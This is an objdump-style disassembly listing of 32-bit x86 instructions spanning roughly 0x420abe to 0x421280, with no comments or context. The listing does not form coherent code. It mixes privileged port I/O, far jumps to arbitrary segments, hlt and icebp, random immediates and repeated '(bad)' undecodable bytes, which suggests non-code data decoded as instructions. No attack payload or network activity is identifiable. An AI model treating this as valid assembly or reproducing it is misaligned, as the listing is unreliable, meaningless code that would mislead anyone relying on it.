  420abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420abf:	data16 in al,0xe5
  420ac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ac3:	ficomp WORD PTR [edi]
  420ac5:	inc    eax
  420ac6:	fwait
  420ac7:	mov    eax,ds:0xe28c5d6b
  420acc:	mov    ds:0xa4fcfdcd,al
  420ad1:	int    0xe6
  420ad3:	dec    edx
  420ad4:	mov    dl,0x67
  420ad6:	dec    ebx
  420ad7:	enter  0x6e06,0xa6
  420adb:	mov    esp,0xa921770d
  420ae0:	test   al,0x10
  420ae2:	pushf  
  420ae3:	mov    ecx,0xfce550cc
  420ae8:	scas   eax,DWORD PTR es:[edi]
  420ae9:	push   0xa6aa8f60
  420aee:	das    
  420aef:	sub    BYTE PTR [esp+ebx*1-0x7ee7f9cb],bl
  420af6:	cmp    al,0x1
  420af8:	xchg   esp,eax
  420af9:	dec    eax
  420afa:	inc    eax
  420afb:	jl     0x420b61
  420afd:	pop    es
  420afe:	push   DWORD PTR [ebx+edi*8+0x70]
  420b02:	jb     0x420b2a
  420b04:	sbb    al,BYTE PTR [eax-0x6d]
  420b07:	sbb    bl,dh
  420b09:	aad    0x4d
  420b0b:	sbb    BYTE PTR [ebx],bh
  420b0d:	pop    esi
  420b0e:	bound  eax,QWORD PTR [ebp-0x5396fe8d]
  420b14:	jo     0x420acb
  420b16:	dec    ecx
  420b17:	sub    DWORD PTR [edx-0x6f5dff4b],eax
  420b1d:	push   ecx
  420b1e:	or     eax,0x9f269310
  420b23:	sbb    eax,0x9ff255ee
  420b28:	mov    al,ds:0xacc4c76e
  420b2e:	rcr    edi,cl
  420b30:	test   eax,0x730264d0
  420b35:	call   0xcc6b:0x8abd702f
  420b3c:	mov    esp,esp
  420b3e:	adc    esi,DWORD PTR [eax+0x674dfb3]
  420b44:	outs   dx,BYTE PTR ds:[esi]
  420b45:	or     al,0x8e
  420b47:	ficomp WORD PTR [edx+0x21]
  420b4a:	dec    ebp
  420b4b:	cmp    al,0x36
  420b4d:	inc    edi
  420b4e:	out    0x9e,al
  420b50:	(bad)  
  420b51:	sub    eax,0x306ddc41
  420b56:	xor    BYTE PTR [ebx+edx*2-0x6e],0xc2
  420b5b:	imul   eax,DWORD PTR [edi-0x72],0x5d38e9ef
  420b62:	or     DWORD PTR ss:[eax],ecx
  420b65:	lods   al,BYTE PTR ds:[esi]
  420b66:	aaa    
  420b67:	xor    ah,ch
  420b69:	dec    esi
  420b6a:	jbe    0x420b20
  420b6c:	mov    ch,ch
  420b6e:	jl     0x420b04
  420b70:	mov    al,0xcd
  420b72:	fucom  st(4)
  420b74:	popf   
  420b75:	(bad)  
  420b76:	push   ebp
  420b77:	sbb    al,BYTE PTR [ebx]
  420b79:	in     al,0xee
  420b7b:	sbb    esp,eax
  420b7d:	ins    DWORD PTR es:[edi],dx
  420b7e:	cli    
  420b7f:	mov    ebp,0xbe02c164
  420b84:	or     BYTE PTR [edx+0x8],bl
  420b87:	adc    cl,BYTE PTR [eax+edx*1+0x5a]
  420b8b:	bound  ebp,QWORD PTR ds:0x54248640
  420b91:	lods   eax,DWORD PTR ds:[esi]
  420b92:	jmp    0xb573:0x2ecf1e03
  420b99:	out    0x5f,al
  420b9b:	xor    al,0x3a
  420b9d:	retf   
  420b9e:	mov    al,ds:0x6bb8de0
  420ba3:	push   ecx
  420ba4:	fld    TBYTE PTR [eax]
  420ba6:	repnz mov esi,0xe888aff9
  420bac:	xchg   ebx,eax
  420bad:	outs   dx,BYTE PTR ds:[esi]
  420bae:	mov    esp,0x9c893b7d
  420bb3:	cmp    ecx,DWORD PTR [esi]
  420bb5:	sbb    eax,0x3a950c2f
  420bba:	mov    esp,0xf59f6a6f
  420bbf:	and    dl,ch
  420bc1:	lock daa 
  420bc3:	(bad)  
  420bc4:	imul   ebp,ebx,0x93475678
  420bca:	cli    
  420bcb:	jecxz  0x420bdd
  420bcd:	fbld   TBYTE PTR [edi]
  420bcf:	xor    al,0x3a
  420bd1:	gs dec esp
  420bd3:	mov    dh,0x5b
  420bd5:	retf   
  420bd6:	(bad)
  420bdb:	pop    eax
  420bdc:	jno    0x420b8a
  420bde:	aad    0x3a
  420be0:	pop    esp
  420be1:	mov    ds:0x3542b2ba,al
  420be6:	fcmovnb st,st(2)
  420be8:	je     0x420bd2
  420bea:	retf   0x6227
  420bed:	pop    ecx
  420bee:	jmp    FWORD PTR [ecx-0x5d6430dd]
  420bf4:	aad    0x21
  420bf6:	push   es
  420bf7:	js     0x420bd4
  420bf9:	and    eax,0xb2ae0974
  420bfe:	das    
  420bff:	imul   eax,DWORD PTR [edi],0x17ed7892
  420c05:	jg     0x420c4e
  420c07:	imul   edx,ebp,0x2cc39540
  420c0d:	clc    
  420c0e:	(bad)  
  420c10:	dec    edi
  420c11:	adc    dh,bh
  420c13:	shl    DWORD PTR [ebx+0x3cda7139],1
  420c19:	mov    al,ds:0xcbae1682
  420c1e:	dec    ecx
  420c1f:	xor    al,0x6
  420c21:	out    0x2c,eax
  420c23:	mov    bl,0x96
  420c25:	inc    edi
  420c26:	inc    edx
  420c27:	test   al,0x65
  420c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c2a:	fld    DWORD PTR [ecx-0x79]
  420c2d:	xchg   ebp,eax
  420c2e:	mov    edx,0x738cf2ea
  420c33:	mov    WORD PTR [esi+0x6],ss
  420c36:	add    DWORD PTR [edx+0x15],esp
  420c39:	push   es
  420c3a:	push   eax
  420c3b:	dec    ebx
  420c3c:	jb     0x420be6
  420c3e:	mov    cs,WORD PTR [ebp-0x419235dc]
  420c44:	aad    0x86
  420c46:	xchg   edi,eax
  420c47:	push   ds
  420c48:	cmp    BYTE PTR [eax],ah
  420c4a:	repz xchg esp,eax
  420c4c:	aad    0xab
  420c4e:	pop    edi
  420c4f:	out    dx,al
  420c50:	sahf   
  420c51:	clc    
  420c52:	xor    ebp,edi
  420c54:	mov    edi,0xbc55dc3
  420c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c5a:	push   ebp
  420c5b:	test   BYTE PTR [eax-0x1ed1f23a],ch
  420c61:	mov    ds:0xe5e4130d,eax
  420c66:	xor    DWORD PTR [ebp+0x12],ebp
  420c69:	jmp    0x5d8:0x64aa9a76
  420c70:	stc    
  420c71:	dec    DWORD PTR [edi+0xe]
  420c74:	sbb    DWORD PTR [esi+esi*1],0xffffffe3
  420c78:	jle    0x420c05
  420c7a:	scas   eax,DWORD PTR es:[edi]
  420c7b:	in     al,0x12
  420c7d:	cwde   
  420c7e:	add    eax,0x56f49b92
  420c83:	mov    esp,0x5507b117
  420c88:	(bad)  
  420c89:	das    
  420c8a:	rcr    BYTE PTR [edi+0x17],0x9
  420c8e:	not    cl
  420c90:	mul    BYTE PTR [esi-0x34cd5955]
  420c96:	mov    ebp,0x31b54ea8
  420c9b:	cdq    
  420c9c:	pop    es
  420c9d:	xor    DWORD PTR [esi+0x6e],ebx
  420ca0:	mov    eax,0x7720d5c4
  420ca5:	mov    eax,0x720359ed
  420caa:	test   al,0x37
  420cac:	xor    al,0xde
  420cae:	jge    0x420c36
  420cb0:	cmova  edx,DWORD PTR [ebx]
  420cb3:	xor    DWORD PTR [eax-0x70],ebx
  420cb6:	in     eax,0xdf
  420cb8:	or     BYTE PTR [esi],dh
  420cba:	xchg   ebx,eax
  420cbb:	xchg   DWORD PTR [ebp-0x44ea5128],ebx
  420cc1:	(bad)  
  420cc2:	sub    eax,0x92f0b8c8
  420cc7:	stc    
  420cc8:	or     eax,DWORD PTR [ebx-0x1bdd2a86]
  420cce:	jb     0x420d06
  420cd0:	rcr    ebx,cl
  420cd2:	mov    dh,0x64
  420cd4:	lahf   
  420cd5:	cmp    ah,BYTE PTR [ebx]
  420cd7:	cli    
  420cd8:	inc    edi
  420cd9:	add    edi,edx
  420cdb:	jo     0x420cac
  420cdd:	jnp    0x420c67
  420cdf:	mov    ebp,ebp
  420ce1:	xlat   BYTE PTR ds:[ebx]
  420ce2:	mov    cs,WORD PTR [ebx+0x3]
  420ce5:	outs   dx,DWORD PTR ds:[esi]
  420ce6:	adc    al,0xf3
  420ce8:	inc    ebx
  420ce9:	fwait
  420cea:	outs   dx,DWORD PTR ds:[esi]
  420ceb:	sub    DWORD PTR [esi-0x1f],eax
  420cee:	push   ss
  420cef:	sub    BYTE PTR [ebx],ah
  420cf1:	add    dh,cl
  420cf3:	and    edx,DWORD PTR [ebx+0x6d]
  420cf6:	pop    ebx
  420cf7:	mov    ds:0x17b9c42c,al
  420cfc:	xor    al,0xa3
  420cfe:	add    DWORD PTR [ebx],edi
  420d00:	sbb    BYTE PTR [ebx-0x63f7c3b0],ch
  420d06:	dec    edi
  420d07:	iret   
  420d08:	shr    BYTE PTR [eax],cl
  420d0a:	lock xor al,0x6a
  420d0d:	pusha  
  420d0e:	sbb    edx,DWORD PTR [edx+0x2d]
  420d11:	or     dl,BYTE PTR [edx+0x63e936cd]
  420d17:	mov    cl,0x74
  420d19:	stc    
  420d1a:	push   eax
  420d1b:	pop    esp
  420d1c:	les    edi,FWORD PTR [ebx+ebx*1+0x25]
  420d20:	mov    bh,0xb4
  420d22:	repz jns 0x420caf
  420d25:	pop    ebp
  420d26:	shl    DWORD PTR [esi+0x7],cl
  420d29:	push   edx
  420d2a:	retf   0x86e8
  420d2d:	addr16 mov ebp,0x6be4140f
  420d33:	leave  
  420d34:	test   DWORD PTR [eax],eax
  420d36:	outs   dx,BYTE PTR ds:[esi]
  420d37:	adc    DWORD PTR [esi+edx*8],ebp
  420d3a:	(bad)  
  420d3b:	repnz pop eax
  420d3d:	xor    eax,0xb6335f7
  420d42:	sub    al,0x8f
  420d44:	jmp    0xd177441b
  420d49:	jbe    0x420dba
  420d4b:	in     al,0xfa
  420d4d:	dec    ecx
  420d4e:	shr    BYTE PTR [ecx+ebp*2-0xe],cl
  420d52:	lods   eax,DWORD PTR ds:[esi]
  420d53:	in     eax,dx
  420d54:	push   cs
  420d55:	mov    esi,0x7ee3ea1c
  420d5a:	xchg   BYTE PTR [edx+0x54],dl
  420d5d:	data16 idiv BYTE PTR [ecx-0xe]
  420d61:	inc    esi
  420d62:	(bad)  
  420d63:	sub    eax,0x57071b71
  420d68:	int    0xa8
  420d6a:	les    edi,FWORD PTR [eax+ebx*1-0x5fbcec1f]
  420d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d72:	mov    WORD PTR [esi],ds
  420d74:	sub    ch,bh
  420d76:	mov    ebp,0x20bf2bfa
  420d7b:	iret   
  420d7c:	mov    edx,0x95dd0f67
  420d81:	imul   ebx,ebp,0x1
  420d84:	mov    ah,0x93
  420d86:	adc    DWORD PTR [edi],0x4
  420d89:	pop    eax
  420d8a:	inc    edi
  420d8b:	rcl    BYTE PTR [ecx],cl
  420d8d:	mov    ecx,0xe765876a
  420d92:	jle    0x420d1a
  420d94:	out    0x25,al
  420d96:	lods   eax,DWORD PTR ds:[esi]
  420d97:	jmp    0x420e17
  420d99:	xor    al,0xb2
  420d9b:	cmc    
  420d9c:	or     al,0x13
  420d9e:	jb     0x420d2b
  420da0:	jp     0x420d31
  420da2:	cli    
  420da3:	sbb    edx,esi
  420da5:	dec    eax
  420da6:	mov    dh,0x6
  420da8:	popf   
  420da9:	(bad)  
  420daa:	repnz mov ebx,0x396b947f
  420db0:	je     0x420dd3
  420db2:	jecxz  0x420ddc
  420db4:	fnstcw WORD PTR [esi-0x748aa1c7]
  420dba:	dec    ebp
  420dbb:	push   edx
  420dbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dbd:	shl    BYTE PTR [edi],1
  420dbf:	fwait
  420dc0:	cmp    al,0x13
  420dc2:	mov    esp,0xd298190b
  420dc7:	cmp    DWORD PTR ss:[ebx+0xb],esi
  420dcb:	dec    esp
  420dcc:	imul   ecx,DWORD PTR [ebp-0x7b1b8f54],0xc0b7150c
  420dd6:	push   edi
  420dd7:	sti    
  420dd8:	sbb    bh,al
  420dda:	sbb    eax,0xab598c2e
  420ddf:	pop    edi
  420de0:	fidiv  DWORD PTR [edx]
  420de2:	outs   dx,DWORD PTR ds:[esi]
  420de3:	xor    eax,0xdb29eb99
  420de8:	imul   ebx,DWORD PTR [edi+0x32869a42],0xffffffc5
  420def:	add    al,0xb8
  420df1:	push   ds
  420df2:	inc    ebp
  420df3:	std    
  420df4:	jne    0x420dda
  420df6:	inc    esi
  420df7:	inc    esi
  420df8:	retf   
  420df9:	and    eax,0x5990da29
  420dfe:	push   eax
  420dff:	jmp    0x420e06
  420e01:	lods   al,BYTE PTR ds:[esi]
  420e02:	repnz add bl,BYTE PTR [esp+eax*1]
  420e06:	sbb    edx,DWORD PTR ds:0xd7c85435
  420e0c:	mov    esi,0xdd5178d7
  420e11:	cmp    eax,0x5a0da576
  420e16:	(bad)  
  420e17:	int    0xbd
  420e19:	xor    eax,0x173b0e22
  420e1e:	cmp    edi,DWORD PTR [ebx+esi*1-0x65]
  420e22:	nop
  420e23:	mov    edx,0x856aaaf1
  420e28:	dec    ebp
  420e29:	mov    bh,0xc7
  420e2b:	dec    ecx
  420e2c:	sbb    eax,0x9156ff31
  420e31:	outs   dx,BYTE PTR ds:[esi]
  420e32:	cmp    ch,al
  420e34:	sub    eax,0x6c71910d
  420e39:	mov    ch,al
  420e3b:	in     eax,0x47
  420e3d:	gs aad 0xcb
  420e40:	push   edx
  420e41:	sub    DWORD PTR [eax-0x3d],ebx
  420e44:	pop    edx
  420e45:	mov    edi,0xeb50f190
  420e4a:	jb     0x420e9d
  420e4c:	sbb    ecx,ebp
  420e4e:	addr16 inc ebx
  420e50:	sbb    BYTE PTR [edx+0x216e8216],al
  420e56:	imul   ebx,DWORD PTR [edi+0x26],0xbeb12410
  420e5d:	xlat   BYTE PTR ds:[ebx]
  420e5e:	pop    edi
  420e5f:	sub    esp,esi
  420e61:	jnp    0x420de9
  420e63:	ins    DWORD PTR es:[edi],dx
  420e64:	cmp    bl,ch
  420e66:	das    
  420e67:	int3   
  420e68:	(bad)  
  420e69:	sbb    eax,0x8758d2c8
  420e6e:	push   edx
  420e6f:	add    edi,DWORD PTR [edx+esi*2]
  420e72:	jo     0x420ec8
  420e74:	std    
  420e75:	out    0x2d,al
  420e77:	jb     0x420e5a
  420e79:	adc    BYTE PTR [eax-0xf],ch
  420e7c:	pop    ss
  420e7d:	test   BYTE PTR [edx+0x45e8f0c],bl
  420e83:	mov    ecx,0x8d94846c
  420e88:	(bad)  
  420e89:	pop    edx
  420e8a:	jmp    0xcc16:0x5f8362a3
  420e91:	repz dec edi
  420e93:	out    0x51,al
  420e95:	xchg   BYTE PTR [ecx],ah
  420e97:	test   BYTE PTR [ecx],dh
  420e99:	jg     0x420ed8
  420e9b:	xchg   ecx,eax
  420e9c:	mov    edx,0xc41591b2
  420ea1:	and    ah,ch
  420ea3:	dec    esi
  420ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ea5:	das    
  420ea6:	mov    esp,0x545c22dc
  420eab:	pop    ss
  420eac:	or     DWORD PTR [esi-0x4f49424f],0xda9dba7e
  420eb6:	or     BYTE PTR [esi+0x72b9cd8d],dl
  420ebc:	jmp    0xbd43a875
  420ec1:	loope  0x420f37
  420ec3:	inc    esp
  420ec4:	imul   esi,ebp,0xd70cb8e7
  420eca:	pop    edi
  420ecb:	dec    ecx
  420ecc:	push   ebp
  420ecd:	jae    0x420e61
  420ecf:	int3   
  420ed0:	scas   al,BYTE PTR es:[edi]
  420ed1:	push   eax
  420ed2:	push   esi
  420ed3:	cmp    BYTE PTR ds:0x96f09d77,ah
  420ed9:	sub    esi,edi
  420edb:	je     0x420f16
  420edd:	cmp    DWORD PTR [edx],ebp
  420edf:	pop    ss
  420ee0:	call   0xfa74:0x84e78b13
  420ee7:	(bad)  
  420ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ee9:	fisubr DWORD PTR [eax-0x3a]
  420eec:	mov    bl,0x7
  420eee:	inc    esi
  420eef:	ss hlt 
  420ef1:	cmp    eax,0xfdcddac3
  420ef6:	jmp    0xbf46e34a
  420efb:	push   cs
  420efc:	push   ds
  420efd:	xchg   esp,eax
  420efe:	xchg   DWORD PTR [ebp-0x39],esp
  420f01:	add    eax,0x9a49064a
  420f06:	test   DWORD PTR ds:0x7d1b6fa3,0x1d335b65
  420f10:	psubsw mm0,mm2
  420f13:	lods   al,BYTE PTR ds:[esi]
  420f14:	xchg   esp,eax
  420f15:	(bad)  
  420f16:	imul   edi,DWORD PTR [eax+ebx*1+0x1f],0x5795ce09
  420f1e:	mov    ss,WORD PTR [edi]
  420f20:	fdiv   QWORD PTR [ecx+0x73fa516f]
  420f26:	sub    esp,DWORD PTR [eax+0x7628ab8f]
  420f2c:	(bad)  
  420f2d:	mov    DWORD PTR [ebx],esi
  420f2f:	cs out 0xfb,eax
  420f32:	mov    eax,ds:0x3e4aeff8
  420f37:	into   
  420f38:	pop    esp
  420f39:	add    esp,ebp
  420f3b:	push   esp
  420f3c:	in     eax,dx
  420f3d:	ror    BYTE PTR [edx+0x45],cl
  420f40:	xchg   DWORD PTR [ecx],ebp
  420f42:	test   eax,0x762ba2f9
  420f47:	imul   esi,ebp,0xa9707bb
  420f4d:	adc    eax,0x1f5714a1
  420f52:	pop    esp
  420f53:	pop    ss
  420f54:	dec    edi
  420f55:	shl    BYTE PTR [ecx+0x68],1
  420f58:	add    DWORD PTR [esi],edi
  420f5a:	push   0xdbdd0883
  420f5f:	jmp    0xe307:0xf34ada47
  420f66:	mov    ecx,0x29f1fc6d
  420f6b:	inc    edx
  420f6c:	ds pop ds
  420f6e:	mov    eax,0x6050fd68
  420f73:	scas   eax,DWORD PTR es:[edi]
  420f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f75:	int3   
  420f76:	push   ebx
  420f77:	adc    dh,dl
  420f79:	ret    
  420f7a:	jnp    0x420f46
  420f7c:	movaps XMMWORD PTR [edx-0x3ca27d7],xmm3
  420f83:	stos   DWORD PTR es:[edi],eax
  420f84:	pushf  
  420f85:	outs   dx,BYTE PTR ds:[esi]
  420f86:	add    ebp,DWORD PTR [edx-0x19305145]
  420f8c:	outs   dx,BYTE PTR ds:[esi]
  420f8d:	test   BYTE PTR [esi],0xdc
  420f90:	mov    WORD PTR [eax],?
  420f92:	leave  
  420f93:	xor    ecx,edi
  420f95:	mov    eax,ds:0xb8e5def
  420f9a:	in     eax,dx
  420f9b:	bnd call 0x16ea0856
  420fa1:	inc    ebx
  420fa2:	jmp    0x9b945456
  420fa7:	dec    ecx
  420fa8:	fcmovb st,st(5)
  420faa:	mov    edi,0x38c02196
  420faf:	or     cl,BYTE PTR [esi]
  420fb1:	adc    ecx,DWORD PTR [edi-0x13]
  420fb4:	and    eax,0xedb101ae
  420fb9:	ds ins BYTE PTR es:[edi],dx
  420fbb:	and    esi,DWORD PTR [eax+0x1d607142]
  420fc1:	mov    edx,DWORD PTR [ebp-0x38]
  420fc4:	mov    bh,0x5
  420fc6:	inc    ecx
  420fc7:	dec    esi
  420fc8:	pop    esi
  420fc9:	hlt    
  420fca:	mov    ecx,gs
  420fcc:	mov    ebp,0x8045bdf
  420fd1:	push   esi
  420fd2:	xchg   ecx,eax
  420fd3:	hlt    
  420fd4:	sub    BYTE PTR [edx-0x77],ah
  420fd7:	call   0xc690da2c
  420fdc:	pop    esi
  420fdd:	outs   dx,DWORD PTR ds:[esi]
  420fde:	dec    edx
  420fdf:	jl     0x420fec
  420fe1:	(bad)  
  420fe2:	push   esi
  420fe3:	xchg   ebx,eax
  420fe4:	aam    0x92
  420fe6:	inc    esp
  420fe7:	mov    eax,0xff59cdc8
  420fec:	add    BYTE PTR [edi-0x3dfeaa86],ch
  420ff2:	mov    bh,0x78
  420ff4:	sbb    dl,al
  420ff6:	cmp    eax,DWORD PTR [edi+eiz*4]
  420ff9:	push   edi
  420ffa:	sti    
  420ffb:	dec    ebx
  420ffc:	mov    edi,0xee883139
  421001:	mov    eax,ds:0xa41cf9de
  421006:	dec    ebp
  421007:	aad    0xb5
  421009:	mov    al,dl
  42100b:	dec    ebx
  42100c:	jp     0x421055
  42100e:	cmp    eax,0xf5d1b732
  421013:	sbb    ch,BYTE PTR [edx-0x1d849a31]
  421019:	sar    BYTE PTR [ebp+eiz*8+0x211786b5],0xf0
  421021:	mov    ebp,0x5139706c
  421026:	cmp    BYTE PTR [esi-0x69611ddc],0x88
  42102d:	mov    dh,0x8c
  42102f:	jmp    0xa407829c
  421034:	pop    es
  421035:	inc    edx
  421037:	inc    ecx
  421038:	sar    dl,1
  42103a:	mov    dl,dl
  42103c:	pop    ss
  42103d:	(bad)  
  42103e:	cli    
  42103f:	add    BYTE PTR [ecx],cl
  421041:	sbb    DWORD PTR [edx],ebx
  421043:	mov    edx,0xf06d666
  421048:	int    0x5d
  42104a:	(bad)  
  42104b:	mov    dh,0x6a
  42104d:	cld    
  42104e:	push   es
  42104f:	push   ecx
  421050:	(bad)  [edx+0x1ec76ff3]
  421056:	shr    BYTE PTR [ebp+0x48],1
  421059:	shl    DWORD PTR [eax-0x4ccfb63],cl
  42105f:	ins    BYTE PTR es:[edi],dx
  421060:	out    dx,al
  421061:	dec    edi
  421062:	pop    esi
  421063:	scas   al,BYTE PTR es:[edi]
  421064:	adc    BYTE PTR [ecx+0x57a5ba],0xfe
  42106b:	sub    dl,ah
  42106d:	push   0x43
  42106f:	push   edx
  421070:	jmp    0x57004958
  421075:	dec    edx
  421076:	imul   eax,DWORD PTR [ecx+0x3b],0x35
  42107a:	sbb    esp,DWORD PTR [ebp+0x6a4b74c5]
  421080:	pop    edi
  421081:	xchg   ebx,eax
  421082:	add    DWORD PTR [edx-0x6c],ecx
  421085:	jno    0x42106e
  421087:	stos   DWORD PTR es:[edi],eax
  421088:	mov    ebx,0x9cc8fd1e
  42108d:	inc    edi
  42108e:	cwde   
  42108f:	dec    esp
  421090:	or     DWORD PTR [ebp-0x6e453b92],edx
  421096:	rcr    BYTE PTR [ebp-0x22a0f1bf],cl
  42109c:	fcom   QWORD PTR [ebx]
  42109e:	dec    ebx
  42109f:	xchg   ebp,eax
  4210a0:	and    esi,edi
  4210a2:	jmp    0x8e2c5d11
  4210a7:	push   cs
  4210a8:	mov    cl,0x3c
  4210aa:	in     eax,0xf0
  4210ac:	ror    BYTE PTR [edx],1
  4210ae:	std    
  4210af:	mov    ecx,0x6a309363
  4210b4:	ror    DWORD PTR [ebx],1
  4210b6:	test   BYTE PTR [ebp+0x30abb842],al
  4210bc:	xlat   BYTE PTR ds:[ebx]
  4210bd:	sahf   
  4210be:	mov    ebp,0x4c0702ab
  4210c3:	and    DWORD PTR [eax],eax
  4210c5:	fwait
  4210c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210c7:	or     ebx,DWORD PTR [ebp-0xf]
  4210ca:	xchg   ecx,eax
  4210cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210cc:	lock jmp 0xff08187e
  4210d2:	xchg   edx,eax
  4210d3:	cmp    ah,BYTE PTR [ecx-0x4]
  4210d6:	pop    ebp
  4210d7:	ss mov esi,0x8703f165
  4210dd:	and    dh,0x85
  4210e0:	cli    
  4210e1:	ficomp WORD PTR [edx-0x7ac83e90]
  4210e7:	scas   al,BYTE PTR es:[edi]
  4210e8:	fcmovb st,st(0)
  4210ea:	lods   eax,DWORD PTR ds:[esi]
  4210eb:	fwait
  4210ec:	cmp    al,0xad
  4210ee:	fstp   QWORD PTR [esi-0x69f978a3]
  4210f4:	sub    ecx,DWORD PTR [ecx-0x116195b5]
  4210fa:	jns    0x421133
  4210fc:	aaa    
  4210fd:	jmp    0x4b6:0x11dfaf45
  421104:	rcr    ebp,cl
  421106:	jno    0x421111
  421108:	retf   0xe0b9
  42110b:	inc    esp
  42110c:	dec    eax
  42110d:	retf   0x76a4
  421110:	jmp    0x421119
  421112:	xchg   ebx,eax
  421113:	sub    al,0x23
  421115:	and    bl,BYTE PTR [ecx-0x5e]
  421118:	stos   DWORD PTR es:[edi],eax
  421119:	out    dx,eax
  42111a:	mov    ss,WORD PTR [esi]
  42111c:	mov    WORD PTR gs:[ecx-0x67],?
  421120:	sub    DWORD PTR [ecx],edx
  421122:	push   0x4d
  421124:	in     al,dx
  421125:	cmp    DWORD PTR [eax],ebp
  421127:	mov    al,ds:0x9e6d0dd6
  42112c:	cld    
  42112d:	sbb    dh,dl
  42112f:	sub    BYTE PTR [ebp-0x25c4f381],dl
  421135:	and    DWORD PTR [esi-0x54],0xf7974238
  42113c:	cmp    BYTE PTR [ebp-0x4b1699d6],dl
  421142:	sahf   
  421143:	adc    ecx,edx
  421145:	cli    
  421146:	jecxz  0x4210e0
  421148:	outs   dx,BYTE PTR ds:[esi]
  421149:	lock mov bh,0x27
  42114c:	push   gs
  42114e:	cmp    dh,cl
  421150:	mov    dl,dh
  421152:	dec    ebp
  421153:	xor    al,bl
  421155:	jge    0x4211d5
  421157:	sub    cl,BYTE PTR [ecx+0xa]
  42115a:	dec    ebx
  42115b:	in     al,0x78
  42115d:	mov    ah,0x64
  42115f:	dec    ecx
  421160:	into   
  421161:	jg     0x4210e8
  421163:	mov    bh,0x72
  421165:	nop
  421166:	add    al,0x97
  421168:	dec    esi
  421169:	dec    ecx
  42116a:	mov    edi,0x57e4ee61
  42116f:	pop    ecx
  421170:	js     0x4211a6
  421172:	sbb    ch,BYTE PTR [ebp-0x62]
  421175:	scas   al,BYTE PTR es:[edi]
  421176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421177:	sar    BYTE PTR [esi+eax*4-0x16],1
  42117b:	loop   0x42119c
  42117d:	stc    
  42117e:	les    ebx,FWORD PTR [ebx]
  421180:	loop   0x4211d3
  421182:	dec    ebp
  421183:	dec    ecx
  421184:	jo     0x421158
  421186:	jbe    0x421119
  421188:	or     ebx,edi
  42118a:	jnp    0x42120a
  42118c:	(bad)  
  42118e:	mov    dl,0xf
  421190:	push   ebp
  421191:	shl    esp,cl
  421193:	sahf   
  421194:	pusha  
  421195:	paddusb mm2,QWORD PTR [edx+0x4357b6b0]
  42119c:	ret    0xf0b6
  42119f:	mov    ch,0x60
  4211a1:	aam    0x9f
  4211a3:	gs jge 0x421196
  4211a6:	sub    BYTE PTR [ebx],cl
  4211a8:	jle    0x4211a9
  4211aa:	dec    ebx
  4211ab:	out    0x25,al
  4211ad:	xchg   esi,eax
  4211ae:	sub    ch,cl
  4211b0:	add    al,0x5e
  4211b2:	pop    ss
  4211b3:	xchg   BYTE PTR [ebp+0x54],bh
  4211b6:	xchg   BYTE PTR [eax-0x789cb4ce],bl
  4211bc:	stos   BYTE PTR es:[edi],al
  4211bd:	mov    bl,0x3f
  4211bf:	ja     0x108f99d5
  4211c5:	sbb    eax,0xb14caece
  4211ca:	push   edx
  4211cb:	cmp    DWORD PTR [eax],0xd
  4211ce:	push   edi
  4211cf:	out    0xfd,al
  4211d1:	mov    edi,DWORD PTR [edx-0x3a]
  4211d4:	sbb    DWORD PTR [esi-0x3d5a3f84],edx
  4211da:	push   0x1aa0749a
  4211df:	gs (bad) 
  4211e1:	repnz cdq 
  4211e3:	in     al,dx
  4211e4:	xor    al,bh
  4211e6:	jecxz  0x421254
  4211e8:	xor    DWORD PTR [edx],esp
  4211ea:	or     al,0x62
  4211ec:	mov    dl,0xb8
  4211ee:	jmp    0x42123f
  4211f0:	add    DWORD PTR [ebx+0x929534],esp
  4211f6:	jno    0x4211f0
  4211f8:	sbb    ch,BYTE PTR [ebx-0x40]
  4211fb:	pop    ds
  4211fc:	xchg   DWORD PTR [esi],edx
  4211fe:	pop    edi
  4211ff:	(bad)  
  421200:	adc    al,BYTE PTR [edi+0x52ecba83]
  421206:	or     ch,BYTE PTR [edi-0x1318efa8]
  42120c:	jl     0x42122e
  42120e:	xchg   ebx,eax
  42120f:	mov    bl,0x3d
  421211:	pop    esi
  421212:	(bad)  
  421213:	lods   al,BYTE PTR ds:[esi]
  421214:	pop    es
  421215:	(bad)  
  421216:	jmp    0x6a8c:0xa18a4a58
  42121d:	ds cmp al,0x3e
  421221:	icebp  
  421222:	das    
  421223:	add    al,0xe
  421225:	jg     0x42129e
  421227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421228:	jg     0x42120c
  42122a:	sbb    eax,0x38409abb
  42122f:	or     DWORD PTR [ecx-0x5e],edx
  421232:	push   eax
  421233:	ins    DWORD PTR es:[edi],dx
  421234:	add    DWORD PTR [edx-0x36],ebp
  421237:	out    0x7a,eax
  421239:	hlt    
  42123a:	fst    st(6)
  42123c:	std    
  42123d:	xchg   DWORD PTR [esi+0x2b],edx
  421240:	loopne 0x421251
  421242:	and    al,BYTE PTR [edi]
  421244:	gs jb  0x421295
  421247:	mov    ?,WORD PTR [edi-0x6c]
  42124a:	cli    
  42124b:	xchg   al,ch
  42124d:	pop    edi
  42124e:	dec    esi
  42124f:	or     BYTE PTR [ebp+0x4231d9f],dl
  421255:	std    
  421256:	dec    edx
  421257:	mov    ah,bh
  421259:	mov    cs,WORD PTR [edx+0x6cc43b72]
  42125f:	pop    ebx
  421260:	push   ds
  421261:	xor    bl,BYTE PTR [esi-0x5e6b9ed2]
  421267:	stos   DWORD PTR es:[edi],eax
  421268:	into   
  421269:	pop    es
  42126a:	jecxz  0x421287
  42126c:	xadd   DWORD PTR [ebx],esp
  42126f:	cli    
  421270:	mov    esp,0xb9696568
  421275:	adc    al,0xea
  421277:	sbb    DWORD PTR [ebx],0xffffff98
  42127a:	pushf  
  42127b:	xchg   edi,eax
  42127c:	ret    0x261e
  42127f:	inc    esi
  421280:	(bad)  
